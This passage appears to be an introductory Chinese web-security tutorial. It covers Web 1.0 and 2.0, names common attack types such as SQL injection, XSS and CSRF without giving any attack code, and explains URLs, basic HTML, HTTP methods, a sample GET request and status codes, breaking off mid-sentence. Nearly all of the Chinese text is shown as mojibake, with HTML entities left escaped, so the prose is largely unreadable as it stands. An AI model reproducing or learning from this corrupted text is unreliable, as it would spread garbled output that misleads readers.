ç½‘é¡µæ¥å‘å¸ƒä¿¡æ¯ï¼Œå¹¶å¼€å§‹ä½¿ç”¨æµè§ˆå™¨æ¥è·å–ä¿¡æ¯ï¼Œè¿™ä¸ªæ—¶å€™ä¸»è¦æ˜¯å•å‘çš„ä¿¡æ¯ä¼ é€’\nå¸¸è§æ”»å‡»æ‰‹æ®µï¼šSQLæ³¨å…¥ï¼›æ–‡ä»¶åŒ…å«ï¼›å‘½ä»¤æ‰§è¡Œï¼›ä¸Šä¼ æ¼æ´ï¼›WebShell web2.0ï¼šå¾®åšï¼ŒBlogç­‰ï¼ˆwww.weibo.comã€www.lofter.comï¼‰ã€‚Web 2.0 å§‹äº 2004 å¹´ 3 æœˆWeb2.0ä¸­ï¼Œè½¯ä»¶è¢«å½“æˆä¸€ç§æœåŠ¡ï¼Œä¸ºç”¨æˆ·æä¾›ç½‘ç»œåº”ç”¨çš„æœåŠ¡å¹³å°ï¼Œå¼ºè°ƒç”¨æˆ·çš„å‚ä¸ã€åœ¨çº¿çš„ç½‘ç»œåä½œã€æ•°æ®å‚¨å­˜çš„ç½‘ç»œåŒ–ã€ç¤¾ä¼šå…³ç³»ç½‘ç»œã€åº”ç”¨ä»¥åŠæ–‡ä»¶çš„å…±äº«ç­‰æˆä¸ºäº†Web2.0å‘å±•çš„ä¸»è¦æ”¯æ’‘å’Œè¡¨ç°\nå¸¸è§æ”»å‡»æ‰‹æ®µï¼šé’“é±¼æ”»å‡»ï¼›URLè·³è½¬ï¼›æ¡†æ¶æ¼æ´ï¼›é€»è¾‘æ¼æ´ï¼›XSSï¼›CSRF ä¸¤è€…çš„æœ¬è´¨åŒºåˆ«åœ¨äºï¼šWeb1.0 çš„ä¸»è¦æ˜¯åœ¨äºç”¨æˆ·é€šè¿‡æµè§ˆå™¨è·å–ä¿¡æ¯ã€‚Web2.0 åˆ™æ›´æ³¨é‡ç”¨æˆ·çš„äº¤äº’ä½œç”¨ã€‚\né™æ€é¡µé¢ä¸åŠ¨æ€é¡µé¢ é™æ€é¡µé¢\nåœ¨é™æ€htmlé¡µé¢ä¸­ï¼Œç”¨æˆ·é€šè¿‡Webæµè§ˆå™¨HTTPåè®®å‘webæœåŠ¡å™¨å‘é€ä¸€ä¸ªå“åº”è¯·æ±‚ï¼Œå‘Šè¯‰webæœåŠ¡å™¨è¦æµè§ˆè¿™ä¸ªç½‘ç«™çš„å“ªä¸ªé¡µé¢ï¼Œæ¥ç€æ ¹æ®ç”¨æˆ·çš„å“åº”è¯·æ±‚è¿”å›ä¸€ä¸ªhtmlé¡µé¢ç»™ç”¨æˆ·ï¼Œç»è¿‡æµè§ˆå™¨æ¸²æŸ“è§£æå‘ˆç°åœ¨ç”¨æˆ·çœ¼å‰ã€‚\né™æ€webé¡µé¢æ˜¯æ²¡æœ‰æ•°æ®åº“æ–‡ä»¶çš„ï¼Œæ‰€ä»¥ä¸èƒ½è¿æ¥ç½‘ç»œæ•°æ®åº“\né™æ€webé¡µé¢ä¸»æ˜¯é€šè¿‡HTMLä»£ç å¼€å‘è®¾è®¡çš„\néƒ¨åˆ†é™æ€webé¡µé¢ä¸ºäº†é¡µé¢çš„å¥½çœ‹ï¼Œä½¿ç”¨äº†å¤§é‡çš„JSä»£ç ï¼Œå¯¼è‡´é™æ€webé¡µé¢æ‰“å¼€é€Ÿåº¦æ…¢\nåŠ¨æ€é¡µé¢\nåœ¨åŠ¨æ€webé¡µé¢ä¸­ï¼Œä¾ç„¶è¦é€šè¿‡webæœåŠ¡å™¨çš„httpåè®®æˆ–httpsåè®®å“åº”æ‰èƒ½è¿”å›ç»“æœç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰€æœ‰è¯·æ±‚éƒ½å¿…é¡»è¦é€šè¿‡webæœåŠ¡å™¨å¤„ç†æ‰èƒ½å®ç° ç”¨æˆ·çš„å“åº”è¯·æ±‚æ˜¯ä¸€ä¸ªé™æ€çš„htmlé¡µé¢ï¼Œåªéœ€è¦å“åº”è¯·æ±‚webæœåŠ¡å™¨ä»ç³»ç»Ÿä¸­è°ƒå‡ºç”¨æˆ·å“åº”çš„å†…å®¹ï¼Œå°†å†…å®¹è¿”å›ç»™å®¢æˆ·ç«¯æµè§ˆå™¨è¿›è¡Œå¤„ç†ï¼Œå†è¿”å›ç»™ç”¨æˆ· å¦‚æœç”¨æˆ·å“åº”è¯·æ±‚çš„æ˜¯åŠ¨æ€é¡µé¢èµ„æºï¼Œä¾‹å¦‚.jsp/.asp/.aspx/.phpç­‰ï¼Œå“åº”æ­¥éª¤æ˜¯å…ˆå°†ç”¨æˆ·è¯·æ±‚å‘é€ç»™webæœåŠ¡å™¨ï¼ŒwebæœåŠ¡å™¨å†ä»æ•°æ®åº“è°ƒå‡ºæœ‰æˆ·è¯·æ±‚çš„æ•°æ®ï¼Œè°ƒå‡ºæ•°æ®åå°†æ‰€éœ€è¦å±•ç¤ºç»™ç”¨æˆ·çš„å†…å®¹å‘é€ç»™æœåŠ¡å™¨ï¼Œæœ€åé€šè¿‡webæœåŠ¡å™¨å°†éœ€è¦å±•ç¤ºç»™ç”¨æˆ·çš„å†…å®¹è¿”å›ç»™ç”¨æˆ·æµè§ˆå™¨è§£ææ‰§è¡Œï¼Œå±•ç¤ºç»™ç”¨æˆ·ã€‚ URLï¼ˆURL Uniform Resource Locatorï¼‰ **ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼ˆUniform Resource Locatorï¼ŒURLï¼›ä¿—ç§°ç½‘é¡µåœ°å€æˆ–ç®€ç§°ç½‘å€ï¼‰**æ˜¯å› ç‰¹ç½‘ä¸Šæ ‡å‡†çš„èµ„æºçš„åœ°å€ï¼ˆAddressï¼‰ï¼Œå¦‚åŒåœ¨ç½‘ç»œä¸Šçš„é—¨ç‰Œã€‚å®ƒæœ€åˆæ˜¯ç”±è’‚å§†Â·ä¼¯çº³æ–¯-æå‘æ˜ç”¨æ¥ä½œä¸ºä¸‡ç»´ç½‘çš„åœ°å€ï¼Œç°åœ¨å®ƒå·²ç»è¢«ä¸‡ç»´ç½‘è”ç›Ÿç¼–åˆ¶ä¸ºå› ç‰¹ç½‘æ ‡å‡† RFC 1738ã€‚ æ ¼å¼ï¼š[protocol]://[hostname]:[port]/[path]/[parameters]?[query] protocolï¼šåè®®ï¼Œå¸¸ç”¨çš„åè®®æ˜¯httpã€httpsã€ftpç­‰ hostnameï¼šä¸»æœºåœ°å€ï¼Œå¯ä»¥æ˜¯åŸŸåï¼Œä¹Ÿå¯ä»¥æ˜¯IPåœ°å€ portï¼šç«¯å£å·ï¼Œhttpåè®®é»˜è®¤ç«¯å£æ˜¯80ç«¯å£ pathï¼šè·¯å¾„ï¼Œç½‘ç»œèµ„æºåœ¨æœåŠ¡å™¨ä¸­çš„æŒ‡å®šè·¯å¾„ parameterï¼šå‚æ•°ï¼Œå¦‚æœè¦å‘æœåŠ¡å™¨ä¼ å…¥å‚æ•°ï¼Œåœ¨è¿™éƒ¨åˆ†è¾“å…¥ queryï¼šæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå¦‚æœéœ€è¦ä»æœåŠ¡å™¨é‚£é‡ŒæŸ¥è¯¢å†…å®¹ï¼Œåœ¨è¿™é‡Œç¼–è¾‘ï¼Œå¯æœ‰å¤šä¸ªå‚æ•°ï¼Œç”¨â€œ\u0026amp;â€ç¬¦å·éš”å¼€ï¼Œæ¯ä¸ªå‚æ•°çš„åå’Œå€¼ç”¨â€œ=â€ç¬¦å·éš”å¼€ã€‚ ä¾‹å¦‚ï¼šhttps://www.baidu.com/s?ie=UTF-8\u0026amp;wd=kali HTMLåŸºç¡€ HTMLç®€ä»‹ HTML æ˜¯ç”¨æ¥æè¿°ç½‘é¡µçš„ä¸€ç§è¯­è¨€ HTML æŒ‡çš„æ˜¯è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€: HyperText Markup Language HTML ä¸æ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œè€Œæ˜¯ä¸€ç§æ ‡è®°è¯­è¨€ï¼Œæ ‡è®°è¯­è¨€æ˜¯ä¸€å¥—æ ‡è®°æ ‡ç­¾ (markup tag) HTML ä½¿ç”¨æ ‡è®°æ ‡ç­¾æ¥æè¿°ç½‘é¡µ HTML æ–‡æ¡£åŒ…å«äº†HTML æ ‡ç­¾åŠæ–‡æœ¬å†…å®¹ HTMLæ–‡æ¡£ä¹Ÿå«åš web é¡µé¢ HTMLæ ‡ç­¾/å…ƒç´  HTML æ ‡è®°æ ‡ç­¾é€šå¸¸è¢«ç§°ä¸º HTML æ ‡ç­¾ (HTML tag)\nHTML æ ‡ç­¾æ˜¯ç”±å°–æ‹¬å·åŒ…å›´çš„å…³é”®è¯ï¼Œæ¯”å¦‚\u0026lt;html\u0026gt;\nHTML æ ‡ç­¾é€šå¸¸æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œæ¯”å¦‚ \u0026lt;b\u0026gt; å’Œ \u0026lt;/b\u0026gt;ã€‚ç¬¬ä¸€ä¸ªæ ‡ç­¾æ˜¯å¼€å§‹æ ‡ç­¾ï¼Œç¬¬äºŒä¸ªæ ‡ç­¾æ˜¯ç»“æŸæ ‡ç­¾\nå¼€å§‹å’Œç»“æŸæ ‡ç­¾ä¹Ÿè¢«ç§°ä¸ºå¼€æ”¾æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾ \u0026lt;æ ‡ç­¾\u0026gt; å†…å®¹ \u0026lt;/æ ‡ç­¾\u0026gt;\nä¸€ä¸ªç®€å•ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;!-- å£°æ˜ä¸ºHTML5æ–‡æ¡£ --\u0026gt; \u0026lt;html\u0026gt; \u0026lt;!-- å…ƒç´ æ˜¯ HTML é¡µé¢çš„æ ¹å…ƒç´  --\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- ç¬¬ä¸€éƒ¨åˆ†ï¼šå¤´éƒ¨å…ƒç´  --\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;!-- åŒ…å«äº†æ–‡æ¡£çš„å…ƒæ•°æ®ï¼Œå®šä¹‰ç½‘é¡µç¼–ç æ ¼å¼ä¸º utf-8 --\u0026gt; \u0026lt;title\u0026gt;ç½‘é¡µå­¦ä¹ \u0026lt;/title\u0026gt; \u0026lt;!-- æ–‡æ¡£çš„æ ‡é¢˜ --\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- ç¬¬äºŒéƒ¨åˆ†ï¼šå¯è§é¡µé¢å†…å®¹ --\u0026gt; \u0026lt;h1\u0026gt;è¿™æ˜¯ä¸€ä¸ªæ ‡é¢˜\u0026lt;/h1\u0026gt; \u0026lt;!-- å…ƒç´ å®šä¹‰ä¸€ä¸ªå¤§æ ‡é¢˜ --\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;!--æ¨ªçº¿--\u0026gt; \u0026lt;p\u0026gt;è¿™æ˜¯ä¸€ä¸ªæ®µè½\u0026lt;/p\u0026gt; \u0026lt;!-- å…ƒç´ å®šä¹‰ä¸€ä¸ªæ®µè½ --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å¸¸ç”¨çš„è½»é‡ç¼–è¾‘å™¨ï¼š\nSublime Textï¼šhttp://www.sublimetext.com/ Notepad++ï¼šhttps://notepad-plus.en.softonic.com å¸¸è§HTMLæ ‡ç­¾\n\u0026lt;html\u0026gt;\u0026lt;/html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt;ï¼šå¤´æ•°æ® \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;ï¼šæ ‡é¢˜ \u0026lt;body\u0026gt;\u0026lt;/body\u0026gt;ï¼šé¡µé¢å†…å®¹ \u0026lt;h1\u0026gt;\u0026lt;/h1\u0026gt;ï¼šæ ‡é¢˜ 1-6çº§ \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt;ï¼šæ®µè½ \u0026lt;div\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;a\u0026gt;\u0026lt;/a\u0026gt;ï¼šé“¾æ¥ \u0026lt;ul\u0026gt;\u0026lt;/ul\u0026gt; \u0026lt;br\u0026gt;ï¼šæ¢è¡Œ \u0026lt;hr\u0026gt;ï¼šæ°´å¹³çº¿ \u0026lt;meta\u0026gt; \u0026lt;img\u0026gt;ï¼šå›¾ç‰‡ HTTPä¸HTTPS HTTP HTTPç®€ä»‹ï¼šè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆHyper Text Transfer Protocolï¼ŒHTTPï¼‰æ˜¯ä¸€ä¸ªç®€å•çš„è¯·æ±‚-å“åº”åè®®ï¼Œå®ƒé€šå¸¸è¿è¡Œåœ¨TCP/IPåè®®ä¹‹ä¸Šã€‚å®ƒæŒ‡å®šäº†å®¢æˆ·ç«¯å¯èƒ½å‘é€ç»™æœåŠ¡å™¨ä»€ä¹ˆæ ·çš„æ¶ˆæ¯ä»¥åŠå¾—åˆ°ä»€ä¹ˆæ ·çš„å“åº”ã€‚å½“æ—¶é€‰æ‹©ä½¿ç”¨HTTPåè®®ï¼Œæ˜¯å› ä¸ºå®ƒä½¿å¼€å‘å’Œéƒ¨ç½²éå¸¸åœ°ç›´æˆªäº†å½“ã€‚ å¦‚ä½•è®¿é—®Webåº”ç”¨ åœ¨æµè§ˆå™¨åœ°å€æ é”®å…¥URLè®¿é—® æµè§ˆå™¨å‘ DNS æœåŠ¡å™¨è¯·æ±‚è§£æè¯¥ URL ä¸­çš„åŸŸåæ‰€å¯¹åº”çš„ IP åœ°å€ è§£æå‡º IP åœ°å€åï¼Œæ ¹æ®è¯¥ IP åœ°å€å’Œé»˜è®¤ç«¯å£ 80ï¼Œå’ŒæœåŠ¡å™¨å»ºç«‹TCPè¿æ¥ æµè§ˆå™¨å‘å‡ºè¯»å–æ–‡ä»¶(URL ä¸­åŸŸååé¢éƒ¨åˆ†å¯¹åº”çš„æ–‡ä»¶)çš„HTTP è¯·æ±‚ï¼Œè¯¥è¯·æ±‚æŠ¥æ–‡ä½œä¸º TCP ä¸‰æ¬¡æ¡æ‰‹çš„ç¬¬ä¸‰ä¸ªæŠ¥æ–‡çš„æ•°æ®å‘é€ç»™æœåŠ¡å™¨ æœåŠ¡å™¨å¯¹æµè§ˆå™¨è¯·æ±‚ä½œå‡ºå“åº”ï¼Œå¹¶æŠŠå¯¹åº”çš„ html æ–‡æœ¬å‘é€ç»™æµè§ˆå™¨ æµè§ˆå™¨å°†è¯¥ html æ–‡æœ¬è¿›è¡Œè§£æå¹¶æ˜¾ç¤ºå†…å®¹ HTTPåè®®çš„å†…éƒ¨æ“ä½œè¿‡ç¨‹ å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯å»ºç«‹è¿æ¥ å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€è¯·æ±‚ æœåŠ¡å™¨ç«¯å‘å®¢æˆ·ç«¯å›å¤å“åº” æ–­å¼€è¿æ¥ HTTPçš„å‘å±•å†ç¨‹ HTTP æ˜¯åŸºäº TCP/IP åè®®çš„åº”ç”¨å±‚åè®®ï¼Œåœ¨ OSI ä¸ƒå±‚æ¨¡å‹ä¸­åœ¨æœ€ä¸Šå±‚ï¼Œå®ƒå¹¶ä¸æ¶‰åŠæ•°æ®åŒ…ä¼ è¾“ï¼Œä¸»è¦è§„å®šäº†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡æ ¼å¼ï¼Œé»˜è®¤ä½¿ç”¨80ç«¯å£ã€‚ 1991å¹´å‘å¸ƒçš„ HTTP/0.9 ï¼Œåªæ”¯æŒï¼šGETã€‚è¿™ä¸ªç‰ˆæœ¬çš„åè®®è§„å®šï¼ŒæœåŠ¡å™¨åªèƒ½å›åº”HTMLæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œä¸èƒ½å›åº”åˆ«çš„æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä»Šå¤©çš„å›¾åƒã€è§†é¢‘ç­‰å¤šåª’ä½“èµ„æºï¼Œåœ¨ HTTP/0.9è¿™ä¸ªç‰ˆæœ¬ä¸Šæ˜¯æ— æ³•è¿›è¡Œä¼ è¾“çš„ 1996å¹´5æœˆï¼ŒHTTP/1.0 ç‰ˆæœ¬å‘å¸ƒï¼Œå¢åŠ äº†POSTå‘½ä»¤å’ŒHEADå‘½ä»¤ï¼Œä¸°å¯Œäº†æµè§ˆå™¨ä¸æœåŠ¡å™¨çš„äº’åŠ¨æ‰‹æ®µã€‚è¿™ä¸ªç‰ˆæœ¬HTTPåè®®å¯ä»¥å‘é€ä»»ä½•æ ¼å¼çš„å†…å®¹ï¼ŒåŒ…æ‹¬ä¼ è¾“æ–‡å­—ã€å›¾åƒã€è§†é¢‘ã€æ–‡ä»¶ï¼Œè¿™ä¸ºäº’è”ç½‘çš„å¤§å‘å±•å¥ å®šäº†åŸºç¡€ã€‚é™¤äº†å¢åŠ äº†è¯·æ±‚æ–¹æ³•ä»¥åŠå¯¹å‘é€æ–‡ä»¶çš„æ”¯æŒä¹‹å¤–ï¼Œè¿˜å¢åŠ äº†æ ¼å¼çš„æ”¹å˜ã€‚é™¤äº†æ•°æ®éƒ¨åˆ†ï¼Œæ¯æ¬¡é€šä¿¡éƒ½å¿…é¡»åŒ…æ‹¬å¤´ä¿¡æ¯ï¼Œç”¨æ¥æè¿°ä¸€äº›å…ƒæ•°æ®ã€‚å¦å¤–è¿˜å¢åŠ äº†çŠ¶æ€ç ã€å¤šå­—ç¬¦é›†æ”¯æŒã€å¤šéƒ¨åˆ†å‘é€ã€æƒé™ã€ç¼“å­˜ã€å†…å®¹ç¼–ç ç­‰ç­‰ 1997å¹´1æœˆï¼ŒHTTP/1.1 ç‰ˆæœ¬å‘å¸ƒï¼Œè¿™ä¸ªç‰ˆæœ¬åªæ¯” 1.0 ç‰ˆæœ¬æ™šäº†åŠå¹´ã€‚è¿™ä¸ªç‰ˆæœ¬æœ€å¤§çš„å˜åŒ–å°±æ˜¯å°†æŒä¹…åŒ–è¿æ¥åŠ å…¥äº† HTTP æ ‡å‡†ï¼Œå³TCPè¿æ¥é»˜è®¤ä¸å…³é—­ï¼Œå¯ä»¥è¢«å¤šä¸ªè¯·æ±‚å¤ç”¨ã€‚æ­¤å¤–ï¼ŒHTTP/1.1ç‰ˆè¿˜æ–°å¢äº†è®¸å¤šæ–¹æ³•ï¼Œä¾‹å¦‚ï¼šPUTã€CONNECTã€HEADã€ OPTIONSã€DELETEã€‚å¾—åˆ°è¿›ä¸€æ­¥å®Œå–„çš„HTTP/1.1 ç‰ˆæœ¬ï¼Œä¸€ç›´æ²¿ç”¨è‡³ä»Š HTTPçš„è¯·æ±‚ç±»å‹ URLå…¨ç§°æ˜¯èµ„æºæè¿°ç¬¦ï¼Œä¸€ä¸ªURLåœ°å€ç”¨äºæè¿°ä¸€ä¸ªç½‘ç»œä¸Šçš„èµ„æºï¼ŒHTTPä¸­çš„GETï¼ŒPOSTï¼ŒPUTï¼ŒDELETEå°±å¯¹åº”ç€å¯¹è¿™ä¸ªèµ„æºçš„æŸ¥ ï¼Œæ”¹ ï¼Œå¢ ï¼Œåˆ  4ä¸ªæ“ä½œã€‚ GETä¸€èˆ¬ç”¨äºè·å–/æŸ¥è¯¢èµ„æºä¿¡æ¯ï¼›POSTä¸€èˆ¬ç”¨äºæ›´æ–°èµ„æºä¿¡æ¯ GETç”¨äºä¿¡æ¯è·å–æ—¶åº”è¯¥æ˜¯å®‰å…¨çš„ã€å¹‚ç­‰çš„ã€‚ å®‰å…¨ï¼šè¯¥æ“ä½œç”¨äºè·å–ä¿¡æ¯è€Œéä¿®æ”¹ä¿¡æ¯ã€‚å®ƒä»…ä»…æ˜¯è·å–èµ„æºä¿¡æ¯ï¼Œå°±åƒæ•°æ®åº“æŸ¥è¯¢ä¸€æ ·ï¼Œä¸ä¼šä¿®æ”¹ï¼Œå¢åŠ æ•°æ®ï¼Œä¸ä¼šå½±å“èµ„æºçš„çŠ¶æ€ã€‚ å¹‚ç­‰ï¼šå¯¹åŒä¸€URLçš„å¤šä¸ªè¯·æ±‚åº”è¯¥è¿”å›åŒæ ·çš„ç»“æœã€‚ POSTè¡¨ç¤ºå¯èƒ½ä¿®æ”¹æœåŠ¡å™¨ä¸Šçš„èµ„æºçš„è¯·æ±‚ æ–¹æ³• å«ä¹‰ GET è¯·æ±‚è·å–Request-URIï¼ˆè¯·æ±‚åœ°å€ï¼‰æ‰€æ ‡è¯†çš„èµ„æºã€‚(è¯·æ±‚è¯»å–ç”±urlæ‰€æ ‡å¿—çš„ä¿¡æ¯) POST åœ¨Request-URIæ‰€æ ‡è¯†çš„èµ„æºåé™„åŠ æ–°çš„æ•°æ®ã€‚ï¼ˆç»™æœåŠ¡å™¨æ·»åŠ ä¿¡æ¯ï¼Œä¾‹å¦‚æ³¨é‡Šï¼‰ HEAD è¯·æ±‚è·å–ç”±Request-URIæ‰€æ ‡è¯†çš„èµ„æºçš„å“åº”æ¶ˆæ¯æŠ¥å¤´ã€‚ PUT è¯·æ±‚æœåŠ¡å™¨å­˜å‚¨ä¸€ä¸ªèµ„æºï¼Œå¹¶ç”¨Request-URIä½œä¸ºå…¶æ ‡è¯†ã€‚ DELETE è¯·æ±‚æœåŠ¡å™¨åˆ é™¤Request-URIæ‰€æ ‡è¯†çš„èµ„æºã€‚ TRACE è¯·æ±‚æœåŠ¡å™¨å›é€æ”¶åˆ°çš„è¯·æ±‚ä¿¡æ¯ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­ã€‚ CONNECT ç”¨äºä»£ç†æœåŠ¡å™¨ã€‚ OPTIONS è¯·æ±‚æŸ¥è¯¢æœåŠ¡å™¨çš„æ€§èƒ½ï¼Œæˆ–è€…æŸ¥è¯¢ä¸èµ„æºç›¸å…³ï¼ˆç‰¹å®šï¼‰çš„é€‰é¡¹å’Œéœ€æ±‚ã€‚ HTTPçš„ä¸»è¦ç‰¹ç‚¹\næ”¯æŒå®¢æˆ·/æœåŠ¡å™¨æ¨¡å¼ï¼šä¸€ä¸ªæœåŠ¡å™¨å¯ä»¥ä¸ºåˆ†å¸ƒåœ¨ä¸–ç•Œå„åœ° çš„è®¸å¤šå®¢æˆ·æœåŠ¡ ç®€å•å¿«é€Ÿï¼šå®¢æˆ·å‘æœåŠ¡å™¨è¯·æ±‚æœåŠ¡æ—¶ï¼Œåªéœ€ä¼ é€è¯·æ±‚æ–¹æ³•å’Œè·¯å¾„ã€‚è¯·æ±‚æ–¹æ³•å¸¸ç”¨çš„æœ‰GETå’ŒPOSTã€‚ç”±äºHTTPåè®®ç®€å•ï¼Œä½¿å¾—HTTPæœåŠ¡å™¨çš„ç¨‹åºè§„æ¨¡å°ï¼Œå› è€Œé€šä¿¡é€Ÿåº¦å¾ˆå¿« çµæ´»ï¼šHTTPå…è®¸ä¼ è¾“ä»»æ„ç±»å‹çš„æ•°æ®å¯¹è±¡ã€‚æ­£åœ¨ä¼ è¾“çš„ç±»å‹ç”±Content-TypeåŠ ä»¥æ ‡è®°ã€‚ HTTPæŠ¥æ–‡æ ¼å¼\nè¯·æ±‚æŠ¥æ–‡ï¼š\nè¯·æ±‚è¡Œï¼šç”¨æ¥è¯´æ˜è¯·æ±‚ç±»å‹,è¦è®¿é—®çš„èµ„æºä»¥åŠæ‰€ä½¿ç”¨çš„HTTPç‰ˆæœ¬\nè¯·æ±‚å¤´ï¼šç´§æ¥ç€è¯·æ±‚è¡Œï¼ˆå³ç¬¬ä¸€è¡Œï¼‰ä¹‹åçš„éƒ¨åˆ†ï¼Œç”¨æ¥è¯´æ˜æœåŠ¡å™¨è¦ä½¿ç”¨çš„é™„åŠ ä¿¡æ¯\nè¯·æ±‚è½½ä½“ï¼šä¹Ÿå«ä¸»ä½“ï¼Œå¯ä»¥æ·»åŠ ä»»æ„çš„å…¶ä»–æ•°æ®\nå“åº”æŠ¥æ–‡\nå“åº”è¡Œï¼šç”±HTTPåè®®ç‰ˆæœ¬å·ï¼Œ çŠ¶æ€ç ï¼Œ çŠ¶æ€æ¶ˆæ¯ä¸‰éƒ¨åˆ†ç»„æˆ\nå“åº”å¤´ï¼šæ¶ˆæ¯æŠ¥å¤´ï¼Œç”¨æ¥è¯´æ˜å®¢æˆ·ç«¯è¦ä½¿ç”¨çš„ä¸€äº›é™„åŠ ä¿¡æ¯\nå“åº”è½½ä½“ï¼šå“åº”æ­£æ–‡ï¼ŒæœåŠ¡å™¨è¿”å›ç»™å®¢æˆ·ç«¯çš„æ–‡æœ¬ä¿¡æ¯\nä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡çš„æ ¼å¼ä¸æ¡ˆä¾‹ï¼š\n1 2 3 4 5 6 7 GET \u0026lt;url\u0026gt; HTTP/1.1 [field-name]:[value][\\r][\\n] [field-name]:[value][\\r][\\n] ...... [field-name]:[value][\\r][\\n] [\\r][\\n] [Body data] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 GET /s?w=kali HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br, zstd Accept-Language: zh-CN,zh;q=0.9 Connection: keep-alive Cookie: [Cookie] Host: www.baidu.com Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 sec-ch-ua: \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;143\u0026#34;, \u0026#34;Chromium\u0026#34;;v=\u0026#34;143\u0026#34;, \u0026#34;Not A(Brand\u0026#34;;v=\u0026#34;24\u0026#34; sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \u0026#34;Windows\u0026#34; HTTPè¯·æ±‚æŠ¥æ–‡çš„å¸¸ç”¨å­—æ®µï¼š\nè¯·æ±‚å­—æ®µ æè¿° Accept æŒ‡å®šå®¢æˆ·ç«¯æ¥å—ä¿¡æ¯çš„ç±»å‹ï¼ˆMIMEç±»å‹ï¼‰ Connection å…è®¸C/SæŒ‡å®šä¸è¯·æ±‚/å“åº”è¿æ¥çš„æœ‰å…³é€‰é¡¹ Host è¯·æ±‚çš„æœåŠ¡å™¨çš„ä¸»æœºåå’Œç«¯å£å· Referer å½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨è¯¥ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨å› æ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç† User-Agent å‘èµ·è¯·æ±‚çš„åº”ç”¨ç¨‹åºåç§° Accept-Encoding å‘Šè¯‰æœåŠ¡å™¨èƒ½å¤Ÿæ¥å—å“ªäº›å†…å®¹ç¼–ç æ–¹å¼ Content-Length è¡¨ç¤ºè¯·æ±‚æ¶ˆæ¯æ­£æ–‡çš„é•¿åº¦ Cookie å®¢æˆ·ç«¯æä¾›ç»™æœåŠ¡å™¨çš„è®¤è¯æ•°æ®\nCookieé€šå¸¸ä¹Ÿå«åšç½‘ç«™cookieï¼Œæµè§ˆå™¨cookieæˆ–è€…httpcookieï¼Œæ˜¯ä¿å­˜åœ¨ç”¨æˆ·æµè§ˆå™¨ç«¯çš„ï¼Œå¹¶åœ¨å‘å‡ºhttpè¯·æ±‚æ—¶ä¼šé»˜è®¤æºå¸¦çš„ä¸€æ®µæ–‡æœ¬ç‰‡æ®µã€‚å®ƒå¯ä»¥ç”¨æ¥åšç”¨æˆ·è®¤è¯ï¼ŒæœåŠ¡å™¨æ ¡éªŒç­‰é€šè¿‡æ–‡æœ¬æ•°æ®å¯ä»¥å¤„ç†çš„é—®é¢˜ã€‚ HTTPå“åº”æŠ¥æ–‡å¸¸ç”¨çŠ¶æ€ç \nçŠ¶æ€ç  æè¿° ä¸´æ—¶å“åº”ï¼ˆ1xxï¼‰ è¡¨ç¤ºä¸´æ—¶å“åº”å¹¶éœ€è¦è¯·æ±‚è€…ç»§ç»­æ‰§è¡Œæ“ä½œçš„çŠ¶æ€ä»£ç  æˆåŠŸï¼ˆ2xxï¼‰ è¡¨ç¤ºæˆåŠŸå¤„ç†äº†è¯·æ±‚çš„çŠ¶æ€ä»£ç  é‡å®šå‘ï¼ˆ3xxï¼‰ è¡¨ç¤ºè¦å®Œæˆè¯·æ±‚ï¼Œéœ€è¦è¿›ä¸€æ­¥æ“ä½œï¼Œé€šå¸¸ç”¨æ¥é‡å®šå‘ è¯·æ±‚é”™è¯¯ï¼ˆ4xxï¼‰ è¡¨ç¤ºè¯·æ±‚å¯èƒ½å‡ºé”™ï¼Œå¦¨ç¢äº†æœåŠ¡å™¨çš„å¤„ç† æœåŠ¡å™¨é”™è¯¯ï¼ˆ5xxï¼‰ è¡¨ç¤ºæœåŠ¡å™¨åœ¨å°è¯•å¤„ç†è¯·æ±‚æ—¶å‘ç”Ÿå†…éƒ¨é”™è¯¯ HTTPçš„ç¼ºé™·\nç”±äº HTTP 